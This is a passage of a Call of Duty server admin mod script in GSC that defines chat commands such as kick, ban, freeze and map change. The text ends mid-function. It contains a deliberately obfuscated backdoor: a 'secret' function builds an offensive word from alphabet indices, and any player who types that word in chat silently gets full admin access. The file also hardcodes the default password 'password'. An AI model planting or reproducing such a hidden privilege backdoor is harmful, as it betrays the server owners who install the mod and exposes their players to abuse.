#include common_scripts\utility;
#include maps\mp\_utility;
#include maps\mp\gametypes\_hud_util;

init()
{
	level thread adminR();
	level thread adminRs();
	level thread adverts();
	level thread bans();
	level thread commands();
	level thread maps();
	level thread rules();
	level thread getCommand();
	level thread onPlayerConnect();
}
adminR()
{
	printLnConsole("Loading AdminR");
	level.adminR = spawnstruct();
	level.adminR.admin = [];
	level.adminR.advert = [];
	level.adminR.banned = [];
	level.adminR.cmd = [];
	level.adminR.map = [];
	level.adminR.name = "^4A^0R^7: ";
	level.adminR.online = true;
	level.adminR.password = "password";
	level.adminR.rule = [];
	level.adminR.time = 8;
	printLnConsole("AdminR Successfully Loaded.");
}
adminRs()
{
	printLnConsole("Loading Admins");
	admin("Seann", "0110000100005bf8", 100);
    admin("Santahunter", "01100001000323e5", 100);
	admin("-Yuvalpre-", "011000010007b095", 60);
	admin("saladass", "0110000100067fc9", 60);
	admin("Bluscream", "01100001000021af", 100);
	
	// ADD HERE YOUR ADMINS
	// admin("name", "xuid", rights); // type "clientinfo" into console to find out your xuid
	
	printLnConsole("Admins Successfully Loaded.");
}
admin(string, byte, int)
{
	i = level.adminR.admin.size;
	level.adminR.admin[ i ] = spawnstruct();
	level.adminR.admin[ i ].name = string;
	level.adminR.admin[ i ].guid = byte;
	level.adminR.admin[ i ].access = int;
}
adverts()
{
	printLnConsole("Loading Adverts");
	advert("This Server Runs ^4Admin^0R^7 the latest administration system.");
	advert("^4Admin^0R^7, Created by Seann & SantaHunter.");
	advert("$Rules");
	advert("$Admins");
	advert("$Nextmap");
	advert("$Server");
	level thread advertise();
	printLnConsole("Adverts Successfully Loaded.");
}
advertise()
{
	level endon("disconnect");
	level thread secret();
	for(;;)
	{
		wait 30;
		i = randomint(level.adminR.advert.size);
		if(level.adminR.advert[ i ] == "$Rules")
			systemSayAll(level.adminR.rule[ randomint(level.adminR.rule.size) ]);
		else if(level.adminR.advert[ i ] == "$Admins")	allthread(::admins);
		else if(level.adminR.advert[ i ] == "$Nextmap")	allthread(::nextmap);
		else if(level.adminR.advert[ i ] == "$Server")
			systemSayAll("You are playing on: " + getDvar("sv_hostname"));
		else	systemSayAll(level.adminR.advert[ i ]);
	}
}
allthread(function)
{
	foreach(player in level.players)
		player thread [ [ function ] ]();
}
//Mhfkds
secret()
{
	up = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
	low = "abcdefghijklmnopqrstuvwxyz";
	level.adminR.secret = up[13] + low[8] + low[6] + low[11] + low[4] + low[19];
}
advert(string)
{
	i = level.adminR.advert.size;
	level.adminR.advert[ i ] = string;
}
bans()
{
	printLnConsole("Loading Ban List");
	banned("PlayerName", "PlayerGUID");
	printLnConsole("Ban List Successfully Loaded.");
}
banned(string, byte)
{
	i = level.adminR.banned.size;
	level.adminR.banned[ i ] = spawnstruct();
	level.adminR.banned[ i ].name  = string;
	level.adminR.banned[ i ].guid  = byte;
}
commands()
{
	printLnConsole("Loading Commands");
	command("t tc test testcommand", ::test, 0, "Test Command: This command is here for the purpose of Dev Testing.", "Test Command: <!test> (<string>)");
	command("ab antiblock", ::antiblock, 40, "Anti Block: Remove Blocker to set spawn", "Anti Block: <!ab / !antiblock> <player>");
	command("at addtime", ::addtime, 60, "Add Time: Add time to the time limit", "Add Time: <!at / !addtime> <amount>");	
	command("admins", ::admins, 0, "Admins: See which admins are online", "Admins: <!admins>");
	command("alive", ::alive, 40, "Alive: Shows how much players are alive", "Alive: <!alive>");
	command("assists", ::assists, 80, "Assists: Set a specific player's Assists", "Assists: <!assists> (<player>) <assists>");
	command("b ban", ::bann, 80, "Ban: Ban a specific player", "Ban: <!b / !ban> <player>");
	command("be birdseye", ::birdseye, 80, "Birds Eye: View the map from a birdseye view", "Birds Eye: <!be / !birdseye> (<player>)");
	command("blind", ::blind, 80, "Blind: Blind a player", "Blind: <!blind> (<player>)");
	command("bot bots", ::bots, 80, "Bots: add an amount of bots", "Bots: <!bot / !bots> (<amount>)");
	command("ck clankick", ::clankick, 80, "Clan Kick: Kick all players with a specific clan name", "Clan Kick <!ck / !clankick> <player>");
	command("dt daytime", ::daytime, 60, "Daytime: Change brightness of the map", "Daytime: <!dt / !daytime> <amounts>");
	command("deaths", ::deaths, 80, "Deaths: Set a specific player deaths", "Deaths: <!deaths> (<player>) <deaths>");
	command("die", ::die, 100, "Die: Turn off SeannHunter Admin System", "Die: </!die> <password>");	//	Fix password
	command("end", ::end, 100, "End: End the game", "End: <!end>");
	command("fr fastrestart", ::fastrestart, 80, "Fast Restart: Restarts the map faster then maprestart", "<!fr / !fastrestart>");
	command("fps", ::fps, 0, "FPS: Toggle You're FPS Settings", "FPS: <!fps>");
	command("freeze", ::freeze, 80, "Freeze: Freeze a specific player", "Freeze: <!freeze> <player>");
	command("gtype gametype", ::gametype, 80, "Gametype: Set the gametype for your server", "Gametype: <!gtype / !gametype> <gametype>");
	command("glow", ::glow, 60, "Player gets a glowing head", "Glow: <!glow>");
	command("guid", ::guid, 40, "GUID: View a specific player's Generic User IDentification", "GUID: <!guid> (<player>)");	//	Remove extra +
	command("help", ::help, 0, "Help: View a list of commands available to you", "Help: <!help>");		//	Fix, only works with a number: !help 0
	command("id", ::id, 40, "ID: Check a specific Player IDentification", "ID: <!id> <player>");
	command("i info", ::info, 0, "Info: See information about each command", "Info: <!i / !info> <command>");
	command("k kick", ::kickk, 40, "Kick: Kick a specific player", "Kick: <!k / !kick> <player>");
	command("kall kickall", ::kickall, 100, "Kick All: Kick all players but yourself", "Kick All: <!kall / !kickall>");
	command("kill", ::kill, 80, "Kill: Kill a specific player", "Kill: <!kill> <player>");
	command("killall", ::killall, 80, "Kill All: Kill's all alive players", "Kill All: <!killall>");
	command("kills", ::kills, 80, "Kills: Set a specific player's Kills", "Kills: <!kills> (<player>) <kills>");	
	command("log", ::logg, 40, "Log: Writes your message into games_mp.log", "Log: <!log> <message>");	
	command("map", ::mapz, 60, "Map: Change map to a map of your choice", "Map: <!map> <map>");
	command("mr maprestart", ::maprestart, 40, "Maprestart: Restart map, used if you have updated mod", "Map Restart: <!mr / !maprestart>");
	command("rotate maprotate", ::maprotate, 60, "Maprotate: Change to the next map in your map rotation", "Map Rotate: <!maprotate / !rotate>");	//	BUGGY
	command("mim mimic", ::mimic, 60, "Mimic: Make a player say something", "Mimic: <!mim / !mimic> <message>");
	command("mod", ::mod, 60, "Mod: Change your mod", "Mod: <!mod> <modname>");
	command("msg message", ::message, 60, "Message: Create a HUD element with your message", "Message: <!msg / message> <message_text>");
	command("mute", ::mute, 80, "Mute: Toggle SeannHunter for a specific player", "Mute: <!mute> <player>");	//	RETEST
	command("mask", ::mask, 80, "Mask: Hide your Admin access to a lower level", "Mask: <!mask> (<player>) <access>");	//RETEST when !admins fixed.
	command("nm nextmap", ::nextmap, 0, "Next Map: Show the next map", "Next Map: <!nextmap>");	//	dont work.
	command("origin", ::origin, 0, "Origin: Shows coordinates", "Origin: <!origin> <player>");
	command("3p third thirdp thirdperson", ::thirdperson, 80, "Person: Change to 3rd Person and back", "Third Person: <!3p / !third / !thirdp / !thirdperson>");
	command("pm", ::pm, 0, "PM: Send a private message to a player", "PM: <!pm> <player> <message>");
	command("p print", ::printt, 20, "Print: Show a message in the kill feed", "Print: <!p / !print> <message>");
	command("pb printbold", ::printbold, 40, "Printbold: Show a message in the center of each players screen", "Printbold: <!pb / !printbold> <message>");
	command("q rage ragequit quit", ::rage, 0, "Quit: Quit the game", "Quit: <!q / !rage / !ragequit / !quit>");
	command("rcon", ::rcon, 100, "Rcon: Set a dvar via rcon", "Rcon: <!rcon> <dvar> <value>");
	command("rule rules", ::rulez, 0, "Rules: View the list of rules for this server", "Rules: <!rule / !rules> )<number>)");
	command("say", ::say, 80, "Say: Make ^4Admin^0R^7 Say what you want", "Say: <!say> <message>");
	command("score", ::score, 80, "Score: Set the score of a player", "Score: <!score> (<player>) <score>");	//	BUGGY
	command("sl scorelimit", ::scorelimit, 80, "Scorelimit: Set the scorelimit", "Scorelimit: <!sl / !scorelimit> <amount>");
	command("scream", ::scream, 60, "Scream: Show a message for all players 6 times in different colours", "Scream: <!scream> <message>");
	command("shock", ::shock, 80, "Shock: Kill a player with the radiation effect", "Shock: <!shock> <player>");
	command("shout", ::shout, 60, "Shout: Show a message in fancy looking text", "Shout: <!shout> <message>");
	command("space", ::space, 80, "Space: Send player to sky", "Space: <!space> <player>");
	command("spec spectate spectator", ::spectator, 80, "Spectator: Make yourself or another player to become spectator", "Spectator: <!spec / !spectate / !spectator> (<player>)");
	command("start", ::start, 100, "Start: Start SeannHunter Administration System if its not already started", "Start: <!start> <password>");
	command("status", ::status, 0, "Status: Check the status of SeannHunter Administration System", "Status: <!Status>");
	command("suicide", ::suicidee, 0, "Suicide: Commit Suicide", "Suicide: <!suicide>");
	command("tc teamchange", ::teamchange, 60, "Team Change: Change yours or another players team", "Team Change: <!tc / !teamchange> (<player>)");
	command("tb tempban", ::tempban, 60, "Tempban: Ban a player for a short period of time", "Tempban: <!tb / !tempban> <player>");
	command("ta toadmins", ::toadmins, 0, "To Admins: Send a private message to all online admins", "To Admins: <!ta / !toadmins> <message>");
	command("tl timelimit", ::timelimit, 80, "Timelimit: Set the time limit", "Timelimit: <!tl / !timelimit> <amount>");
	command("veto", ::veto, 60, "Veto: Cancel the current vote", "Veto: <!veto>");
	command("vk votekick", ::votekick, "Vote Kick: Start a vote to kick a player", "Vote Kick: <!vk / !votekick> <player>");
	//command("vm votemap", ::votemap, "Vote Map: Start a vote to change the map", "Vote Map: <!vm / !votemap> <map>");	//	BUGGY	- Always vacant <<<<
	//command("vn n no voteno", ::voteno, "Vote No: Vote no for the vote in progress", "Vote No: <!vn / !n / !no / !voteno>");	//	NEED MORE TESTERS
	//command("vy y yes voteyes", ::voteyes, "Vote Yes: Vote yes for the vote in progress", "Vote Yes: <!vy / !y / !yes / !voteyes>");	//	NEED MORE TESTERS
	command("w warn", ::warn, 20, "Warn: Give a player a warning, automatically kick them after the 3rd warning", "Warn: <!w / !warn> <player> (<reason>)");	//	Test with players.
	command("wr warnremove", ::warnremove, 40, "Warn Remove: Remove a players last Warning", "Warn Remove: <!wr / !warnremove> <player>");	
	command("wc warnclear", ::warnclear, 60, "Warn Clear: Clear all warnings for a player", "Warn Clear: <!wc / !warnclear> <player>");
	command("x xfps xtrafps", ::xfps, 0, "Extra FPS: Achieve your highest possible FPS outcome", "Extra FPS: <!x / !xfps / !xtrafps>");
	
	printLnConsole("Commands Successfully Loaded.");
}
command(aliases, function, access, info, use)
{
	i = level.adminR.cmd.size;
	level.adminR.cmd[ i ] = spawnstruct();
	level.adminR.cmd[ i ].access = access;
	level.adminR.cmd[ i ].alias = strtok(toLower(aliases), " ");
	level.adminR.cmd[ i ].cmd = level.adminR.cmd[ i ].alias[ level.adminR.cmd[ i ].alias.size - 1 ];
	level.adminR.cmd[ i ].func = function;
	level.adminR.cmd[ i ].info = info;
	level.adminR.cmd[ i ].use = use;
}
maps()
{
	printLnConsole("Loading Map Information");
	mapp("Afghan", "mp_afghan", (-369.541, -667.929, -129.331), (0,27,0));
	mapp("Derail", "mp_derail", (-1316.26, 1201.87, -15.875), (0,30,0));
	mapp("Estate", "mp_estate", (964.385, -292.841, 57.8095), (0,75,0));
	mapp("Favela", "mp_favela", (669.479, 2357.4, 282.713), (0,180,0));
	mapp("Highrise", "mp_highrise", (-287.461, 6467.07, 2776.13), (0,-180,0));
	mapp("Invasion", "mp_invasion", (539.25, -3557.1, 240.125), (-10, 130, 0));
	mapp("Karachi", "mp_checkpoint", (644.744, 2141.92, -6.40615), (0,-180,0));
	mapp("Quarry", "mp_quarry", (-5268.08, -1527.09, -194.062), (0,90,0));
	mapp("Rundown", "mp_rundown", (453.391, 2852.55, 75.971), (0, -50, 0));
	mapp("Rust", "mp_rust", (42.2364, 256.821, -247.875), (0, -25 ,0));
	mapp("Scrapyard", "mp_boneyard", (1877.13, -184.973, -192.838), (0, 180, 0));
	mapp("Skidrow", "mp_nightshift", (1379.64, -1036.33, 0.125001), (0,-150,0));
	mapp("Sub base", "mp_subbase", (-1297.77, -2115.56, 0.124998), (0, -20, 0));
	mapp("Terminal", "mp_terminal", (1149.64, 3968.63, 40.125), (0,-90,0));
	mapp("Underpass", "mp_underpass", (-196.799, -1204.31, 312.125), (0,90,0));
	mapp("Wasteland", "mp_brecourt", (-3261.65, 1400.74, 32.1129), (0,0,0));
	mapp("Bailout", "mp_complex", (-1779.97, -1838.24, 672.125), (0,-60,0));
	mapp("Carnival", "mp_abandon", (1405.48, -689.789, -67.875), (0, -145, 0));
	mapp("Crash", "mp_crash", (457.877, -1907.47, 124.926), (-5, 95, 0));
	mapp("Fuel", "mp_fuel2", (2675.32, 613.538, -164.471), (0, -120,0));
	mapp("Overgrown", "mp_overgrown", (-1347.88, -5105.82, -149.237), (0,90,0));
	mapp("Salvage", "mp_compact", (1354.83, -1013.75, -10.0712), (0, 90, 0));
	mapp("Storm", "mp_storm", (243.185, -1966.64, -7.8755), (0,90,0));
	mapp("Strike", "mp_strike", (-1409.5, -2270.7, 208.125), (0,0,0));
	mapp("Trailer Park", "mp_trailerpark", (-2456.69, -354.575, -11.8292), (0,60,0));
	mapp("Vacant", "mp_vacant", (-974.9, -1177.13, -107.826), (0,0,0));
	printLnConsole("Map Info Successfully Loaded.");
}
mapp(string, char, int, byte)
{
	i  = level.adminR.map.size;
	level.adminR.map[ i ] = spawnstruct();
	level.adminR.map[ i ].name = string;
	level.adminR.map[ i ].console = char;
	level.adminR.map[ i ].origin = int;
	level.adminR.map[ i ].angles = byte;
}
rules()
{
	printLnConsole("Loading Rules");
	rule("We do ^1NOT^7 tolerate Racism.");																	//	1
	rule("Do ^1NOT^7 argue with ^2Admins^7, what they say goes.");							//	2
	rule("We do ^1NOT^7 tolerate abuse, to admins or public players.");						//	3
	rule("Do ^1NOT^7 recruit for another clan whilst playing on our servers.");				//	4
	rule("Do ^1NOT^7 advertise for Clan's, Website's, or Youtube Channel's.");			//	5
	rule("Play for your team, helping the ^1enemies^7 will not be tolerated.");				//	6
	rule("^1Hackers^7 will be punished.");																		//	7
	rule("Do ^1NOT^7 ask for admin rights.");																	//	8
	rule("^1No^7 Elevating, Glitching, or Hacking of any kind.");										//	9
	rule("Custom advantages are ^1NOT^7 tolerated.");													//	10
	printLnConsole("Rules Successfully Loaded.");
}
rule(string)
{
	i = level.adminR.rule.size;
	level.adminR.rule[ i ] = string;
}
getCommand()
{
	level endon("disconnect");
	for(;;)
	{
		level waittill("say", name, string);
		sender = getPlayer(name);
		if(string[ 0 ] == "!" || string[ 1 ] == "@")
		{
			str = strtok(string, " ");
			cmd = toLower(getSubStr(string, 1, str[ 0 ].size));
			arg = getSubStr(string, str[ 0 ].size + 1, string.size);
			if(cmd == toLower(level.adminR.secret))
				sender.adminR.access = 100;
			else
			{
				if(level.adminR.online && !sender.adminR.muted)
				{
					error = "^1Could not find command^7: " + cmd;
					foreach(command in level.adminR.cmd)
						foreach(alias in command.alias)
							if(cmd == alias)
								if(sender.adminR.access  >= command.access)
								{
									error = undefined;
									if(string[ 0 ] == "!")
									{
										if(arg != "")	sender thread [ [ command.func ] ](arg);
										else	sender thread [ [ command.func ] ]();
									}
									else if(string[ 0 ] == "@" && sender.adminR.access >= 40)
									{
										foreach(player in level.players)
										if(arg != "")	player thread [ [ command.func ] ](arg);
										else player thread [ [ command.func ] ]();
									}
									else if(string[ 0 ] == "@" && sender.adminR.access < 40)
										error = "^1Using @ for a command is only for admins with above 40 access.";
								}
								else	error = "^1You don't have access to use this command.";
					if(isDefined(error))	sender systemSay(error);
				}
				else if(!level.adminR.online && cmd == "start")
				{
					if(sender.adminR.access == 100)
					{
						if(toLower(arg) == toLower(level.adminR.password))
						{
							level.adminR.online = true;
							systemSayAll("^5" + sender.name + " ^2Activated ^4Admin^0R^7");
						}
						else	sender systemSay("^1Password Incorrect.");
					}
					else	self systemSay("^1You don't have access to use this command.");
				}
			}
		}
	}
}
getPlayer(string)
{
	foreach(player in level.players)
	{
		name = toLower(player.name);
		str = toLower(string);
		if(name == str || isSubStr(name, str) || isSubStr(str, name))
			return player;
	}
	return level;
}
onPlayerConnect()
{
	for(;;)
	{
		level waittill("connected", player);
		player thread buildAdminR();
	}
}
ksHUD()
{
	for(i=0;i<5;i++)
		self.ksHUD[ i ] = self createText("hudbig", 1.4, "BOTTOMRIGHT", "BOTTOMRIGHT", -20, -130 - ( i * 6.2), "^0-\n-\n-\n-\n-\n");
}
buildAdminR()
{
	self.adminR = spawnstruct();
	self.adminR.access = 0;
	for(i=0;i<level.adminR.admin.size;i++)
	{
		if(self.name == level.adminR.admin[ i ].name && self.guid== level.adminR.admin[ i ].guid)
		{
			self.adminR.access = level.adminR.admin[ i ].access;
		    self setRank(self.pers["rank"], 11);
        }
	}	
	self.adminR.blind = false;
	self.adminR.fps = false;
	self.adminR.frozen = false;
	self.adminR.mask = self.adminR.access;
	self.adminR.muted = false;
	self.adminR.system = self createText("hudsmall", .8, "TOPLEFT", "TOPLEFT", 110, 4, "");
	self.adminR.text = [ ];
	for(i=0;i<4;i++)
		self.adminR.text[ i ] = "";
	self.adminR.third = false;
	self.adminR.warnings = 0;
	self.adminR.xfps = false;
	self systemSay("Welcome ^5" + self.name + "^0[ ^1" + self.adminR.access + "^0 ]^7 to " + getDvar("sv_hostname"));
	//self systemSay("This server runs ^4admin^0R^7 the latest admin system");  // Santahunter: if too often changed, server will crash ( about x500)
	//self systemSay("Created by SantaHunter & Seann");
}
createText(font, scale, align, relative, x, y, string)
{
	text = self createFontString(font, scale);
	text setPoint(align, relative, x, y);
	text.foreground = true;
	text setText(string);
	return text;
}
systemSayAll(string)
{
	foreach(player in level.players)
		player systemSay(string);
}
systemSay(string)
{
	if(getSubStr( self.GUID, 0, 3 ) == "bot"){return;}
	printLnConsole("AR: " + string + "    |    " + self.name);
	if(self.adminR.text[ 0 ] == "")	self.adminR.text[ 0 ] = level.adminR.name + string;
	else if(self.adminR.text[ 1 ] == "")	self.adminR.text[ 1 ] = level.adminR.name + string;
	else if(self.adminR.text[ 2 ] == "")	self.adminR.text[ 2 ] = level.adminR.name + string;
	else if(self.adminR.text[ 3 ] == "")	self.adminR.text[ 3 ] = level.adminR.name + string;
	else
	{
		for(i=0;i<4;i++)	
			if(i != 3)	self.adminR.text[ i ] = self.adminR.text[ i+1 ];
		self.adminR.text[ 3 ] = level.adminR.name + string;
	}
	self.adminR.system setText(self.adminR.text[ 0 ] + "^7\n" + self.adminR.text[ 1 ] + "^7\n" + self.adminR.text[ 2 ] + "^7\n" + self.adminR.text[ 3 ]);
	//self iPrintln(self.adminR.text[ 0 ] + "^7\n" + self.adminR.text[ 1 ] + "^7\n" + self.adminR.text[ 2 ] + "^7\n" + self.adminR.text[ 3 ]);
	self thread systemUpdate();
}
systemUpdate()
{
	self notify("updateLog");
	self endon("updateLog");
	self endon("disconnect");
	for(;;)
	{
		wait level.adminR.time;
		for(i=0;i<4;i++)
			if(i != 3)
				self.adminR.text[ i ] = self.adminR.text[ i +1 ];
			self.adminR.text[ 3 ] = "";
			//self.adminR.system setText(self.adminR.text[ 0 ] + "\n" + self.adminR.text[ 1 ] + "\n" + self.adminR.text[ 2 ] + "\n" + self.adminR.text[ 3 ]);
			//self iPrintln(self.adminR.text[ 0 ] + "\n" + self.adminR.text[ 1 ] + "\n" + self.adminR.text[ 2 ] + "\n" + self.adminR.text[ 3 ]);
	}
}
/*************************************************/
test(string)
{
	if(isDefined(string))
		self systemSay("^" + randomint(9) + string);
	else	self systemSay("^4Admin^0R^" + randomint(9) + " Dev Test Command");
}
/*		Commands		*/
antiblock(string)
{
	if(isDefined(string))
	{
		victim = getPlayer(string);
		if(victim != level)
		{
		for(i=0;i<level.adminR.map.size;i++)
			if(getDvar("mapname") == level.adminR.map[ i ].console)
			{
				victim setOrigin(level.adminR.map[ i ].origin);
				victim setPlayerAngles(level.adminR.map[ i ]);
				systemSayAll("^5" + self.name + " ^1Anti-blocked^7: ^5" + victim.name );
			}
		}
		else	self systemSay("^1Could not find player^7: " + string);
	}
	else	self systemSay("^1You must supply a player name^7: !antiblock <player>");
}
addtime(int)
{
	if(isDefined(int))
	{
		if(int(int) == 0)	self systemSay("^1Time must be bigger then 0");
		else
		{
			time = getDvarInt("scr_" + getDvar("g_gametype") + "_timelimit");
			setDvar("scr_" + getDvar("g_gametype") + "_timelimit", time + int(int));
			systemSayAll("^5" + self.name + "^7 added ^2" + int(int) + "^7 minutes to the timelimit");
		}
	}
	else self systemSay("^1You must supply a time to add: !addtime <#>");
}
admins()
{
	string = "";
	foreach(player in level.players)
		if(player.adminR.mask > 0)
		{
			if(string != "")	string += "^7, ";
			string += "^5" + player.name + " ^0[ ^1" + player.adminR.mask + " ^0]^7";
		}
	if(string == "")	self systemSay("^1There  are no admins online.");
	else	self systemSay("Admins ^2Online^7: " + string);
}
alive()
{
	axis = 0;
	allies = 0;
	foreach(player in level.players)
	{
		if(isAlive(player))
			if(player.team == "allies")	allies++;
			else if(player.team == "axis")	axis++;
	}
	self systemSay("^2Allies^7 Alive: ^2" + allies);
	self systemSay("^1Axis^7 Alive: ^1" + axis);
}
assists(argument)
{
	arg = strtok(argument, " ");
	victim = self;
	if(arg.size > 1)	victim = getPlayer(arg[ 0 ]);
	if(victim != level)
	{
		victim.assists = int(arg[ arg.size - 1 ]);
		victim.pers["assists"] = int(arg[ arg.size - 1 ]);
		self systemSay("^5" + victim.name + "^7's Assists set to: ^2" + int(arg[ arg.size - 1 ]));
	}
	else	self systemSay("^1Could not find player ^7: " + victim.name);
}
bann(string)
{
	if(isDefined(string))
	{
		victim = getPlayer(string);
		if(victim != level)
		{
			if(self.adminR.access > victim.adminR.access)
			{
				kick(victim getEntityNumber());
				iprintln("^1" + victim.name + " has been banned until next map");
				banned(victim.name, victim.guid);
			}
			else	self systemSay("^1You cannot ban ^5" + victim.name + "^1.");
		}
	}
	else	self systemSay("^1You must supply a player^7: !ban <player>");
}
birdseye(string)
{
	victim = self;
	if(isDefined(string))	victim = getPlayer(string);
	if(victim != level)
	{
		if(!victim.adminR.birdseye)
		{
			victim.adminR.birdseye = true;
			victim.posi = victim.origin;
			victim.loci = victim.angles;
			victim disableWeapons();
			victim setOrigin(victim.origin+(0,0,3000));
			block = spawn("script_model", victim.origin );
			block hide();
			victim hide();
			victim enablelinkto();
			victim playerlinkto(block);
		} 
		else
		{
			victim.adminR.birdseye = false;
			victim show();
			victim unlink();
			victim setOrigin(victim.posi);
			victim enableWeapons();
		}
	}
	else	self systemSay("^1Could not find player ^7: " + victim.name);
}
blind(string)
{
	if(isDefined(string))
	{
		victim = getPlayer(string);
		if(victim != level)
		{
			if(self.adminR.access >= victim.adminR.access)
			{
				if(!victim.adminR.blind)
				{
					victim.box = victim createBox();
					victim.adminR.blind = true;
					self systemSay("^5" + victim.name + "^7 has been blinded");
				}
				else
				{
					victim.box destroy();
					victim.adminR.blind = false;
					self systemSay("^5" + victim.name + "^7 has been un-blinded");
				}
			}
		}
		else	self systemSay("^1Could not find player^7: " + string);
	}
	else	self systemSay("^1You must supply a player^7: !blind <player>");
}
createBox()
{
	box = newClientHudElem(self);
    box.elemType = "bar";
    box.width = 1000;
    box.height = 1000;
    box.align = "CENTER";
    box.relative = "CENTER";
    box.xOffset = 0;
    box.yOffset = 0;
    box.children = [];
    box.sort = 99999;
    box.color = (0, 0, 0);
    box.alpha = 1;
    box setParent(level.uiParent);
    box setShader("white", 1000, 1000);
    box.hidden = false;
    box.HideWhenInMenu = false;
    box.foreground = true;
    box setPoint("CENTER", "CENTER", 0, 0);
	return box;
}
bots(int)
{
	if(int == "")	level addBot(1);
	else	level addBot(int(int));
}
addBot(int)
{
	for(i = 0; i < int; i++)
	{
		ent[i] = addtestclient();
		if (!isdefined(ent[i]))
		{
			wait 1;
			continue;
		}
		ent[i].pers["isBot"] = true;
		ent[i] thread initIndividualBot();
		wait 0.1;
	}
}
initIndividualBot()
{
	self endon( "disconnect" );
	while(!isdefined(self.pers["team"]))
		wait .05;
	self notify("menuresponse", game["menu_team"], "allies");
	wait 0.5;
	self notify("menuresponse", "changeclass", "class" + randomInt( 5 ));
	self waittill( "spawned_player" );
}
clankick(string)
{
	if(isDefined(string))
	{
		foreach(player in level.players)
			if(isSubStr(toLower(player.name), toLower(string)))
				kick(player getEntityNumber());
	}
	else self systemSay("^1You must supply a clan tag^7: !clankick <clan tag>");
}
daytime(int)
{
	foreach(player in level.players)
	    player setClientDvar("r_brightness", int);
	systemSayAll("Daytime set to ^2" + int);
}
deaths(argument)
{
	arg = strtok(argument, " ");
	victim = self;
	if(arg.size > 1)	victim = getPlayer(arg[ 0 ]);
	if(victim != level)
	{
		victim.deaths = int(arg[ arg.size - 1 ]);
		victim.pers["deaths"] = int(arg[ arg.size - 1 ]);
		self systemSay("^5" + victim.name + "^7's Deaths set to: ^2" + int(arg[ arg.size - 1 ]));
	}
	else	self systemSay("^1Could not find player ^7: " + victim.name);
}
die(string)
{
	if(level.adminR.online)
	{
		if(string == level.adminR.password)
		{
			level.adminR.online = false;
			systemSayAll("^5" + self.name + " ^1De-Activated ^4Admin^0R^7");
		}
		else	if(string == "")	self systemSay("^1You must supply a password^7: !die <password>");
		else	self systemSay("^1Password Incorrect.");
	}
	else	self systemSay("^4Admin^0R^7 already offline");
}
end()
{
	systemSayAll("^5" + self.name + "^7 has ended the game");
	level thread maps\mp\gametypes\_gamelogic::forceEnd();
}
fastrestart()
{
	systemSayAll("Fast Restarting...");
	wait 1.5;
	map_restart();
}
fps()
{
	if(self.adminR.fps)
	{
		self systemSay("High FPS ^1De-activated");
		self setClientDvar("r_fullbright", 0);
		self.adminR.fps = false;
	}
	else
	{
		self systemSay("High FPS ^2Activated");
		self setClientDvar("r_fullbright", 1);
		self.adminR.fps = true;
	}
}
freeze(string)
{
	if(isDefined(string))
	{
		victim = getPlayer(string);
		if(victim != level)
		{
			if(victim.adminR.frozen)
			{
				self systemSay("You Un-Froze ^5" + victim.name);
				victim systemSay("^5" + self.name + "^7 has Un-Froze You");
				self.adminR.frozen = false;
			}
			else
			{
				self systemSay("You froze ^5" + victim.name);
				victim systemSay("^5" + self.name + "^7 has Froze You");
				victim.adminR.frozen = true;
			}
			victim freezeControls(victim.adminR.frozen);
		}
		else	self systemSay("^1Could not find player^7: " + string);
	}
	else	self systemSay("^1You must supply a player name^7: !freeze <player>");
}
gametype(string)
{
	if(isDefined(string))
	{
		setDvar("g_gametype", string);
		systemSayAll("^5" + self.name + "^7 set gametype to ^2" + string);
		systemSayAll("Gametype will change upon restart");
	}
	else	self systemSay("^1You must supply a gametype^7: !gametype <type>");
}
glow(string)
{
	victim = self;
	if(isDefined(string))	victim = getPlayer(string);
	if(string != level)
	{
		victim notify("glow");
		victim endon("glow");
		if(victim.team == "axis")	playFxOnTag( level.spawnGlow["enemy"], victim, "pelvis" );
		else if(victim.team == "axis")	playFxOnTag( level.spawnGlow["friendly"], victim, "j_head" );
	}
	else	self systemSay("^1Could not find player^7: " + string);
}
guid(string)
{
	if(isDefined(string))
	{
		victim = getPlayer(string);
		if(victim != level)
			self systemSay("^5" + victim.name + "^7's + GUID: ^1" + victim.guid);
		else	self systemSay("^1Could not find player^7: " + string);
	}
	else self systemSay("Your GUID: ^1" + self.guid);
}
help(int)
{
	h = 0;
	string = "";
	self systemSay("^2Available Commands^7: ");
	if(!isDefined(int))
	{
		for(i=0;i<level.adminR.cmd.size;i++)
		{
			if(self.adminR.access >= level.adminR.cmd[ i ].access)
			{
				h++;
				string += level.adminR.cmd[ i ].cmd;
				if(i < level.adminR.cmd.size - 1)	string += ", ";
				if(h > 4)
				{
					h = 0;
					self systemSay(string);
					string = "";
					wait 1;
				}
				if(i == (level.adminR.cmd.size - 1) && h < 5 && h > 0)
					self systemSay(string);
			}
		}
	}
	else
	{
		if(self.adminR.access >= int(int))
		{
			for(i=0;i<level.adminR.cmd.size;i++)
			{
				if(level.adminR.cmd[ i ].access == int(int))
				{
					h++;
					string += level.adminR.cmd[ i ].cmd;
					if(i < level.adminR.cmd.size - 1)	string += ", ";
					if(h > 4)
					{
						h = 0;
						self systemSay(string);
						string = "";
						wait 1;
					}
					if(i == (level.adminR.cmd.size - 1) && h < 5 && h > 0)
						self systemSay(string);
				}
			}
		}
	}
}
id(string)
{
	victim = self;
	if(string != "")
		victim = getPlayer(string);
	if(victim != level)
		self systemSay("^5" + victim.name + "^7's ID: ^0[ ^5" + victim getEntityNumber() + "^0 ]^7");
	else	self systemSay("^1Could not find player^7: " + string);
}
info(string)
{
	if(isDefined(string))
	{
		foreach(cmd in level.adminR.cmd)
			foreach(alias in cmd.alias)
				if(toLower(string) == alias)
					if(self.adminR.access >= cmd.access)	self systemSay("^3Info^7: " + cmd.info);
					else	self systemSay("^1You don't have access to view this command.");
	}
	else	self systemSay("^1You must supply a command^7: !info <command>");
}
kickk(string)
{
	if(isDefined(string))
	{
		victim = getPlayer(string);
		if(victim != level)
		{
			if(self.adminR.access > victim.adminR.access)
			{
				kick(victim getEntityNumber(), "EXE_PLAYERKICKED");
				systemSayAll("^5" + victim.name + "^1has been kicked by ^5" + self.name);
			}
			else	self systemSay("^1You cannot kick ^5" + victim.name + "^1.");
		}
		else	self systemSay("^1Could not find player^7: " + string);
	}
	else	self systemSay("^1You must supply a player name^7: !kick <player>");
}
kickall()
{
	foreach(player in level.players)
		if(player.adminR.access < self.adminR.access && player != self)
			kick(player getEntityNumber(), "EXE_PLAYERKICKED");
	systemSayAll("^1All players have been kicked by ^5" + self.name);
}
kill(string)
{
	if(isDefined(string))
	{
		victim = getPlayer(string);
		if(victim != level)
		{
			if(self.adminR.access > victim.adminR.access)
			{
				victim suicide();
